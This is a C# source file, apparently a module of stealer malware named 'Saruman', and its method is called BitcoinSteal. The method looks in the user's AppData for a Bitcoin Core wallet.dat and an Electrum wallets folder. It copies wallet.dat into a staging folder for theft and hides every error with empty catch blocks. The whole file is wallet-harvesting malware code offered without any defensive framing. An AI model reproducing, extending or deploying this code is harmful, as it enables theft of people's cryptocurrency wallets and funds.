﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Saruman.Utilies.Wallets
{
    class Wallets
    {
        public static void BitcoinSteal(string dir)
        {
            try
            {
                string text = Path.Combine(dir, "Wallets");
                if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallet.dat")) || Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum", "wallets")))
                {
                   
                    Directory.CreateDirectory(text);
                    try
                    {
                        if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallet.dat")))
                        {
                            Directory.CreateDirectory(Path.Combine(text, "Bitcoin"));
                            File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallet.dat"), Path.Combine(text, "Bitcoin", "wallet.dat"));
                        }
                    }
                    catch
                    {
                    }
                    try
                    {
                        if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum", "wallets")))
                        {
                            Directory.CreateDirectory(Path.Combine(text, "Electrum"));
                        }
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
        } 
        }
}
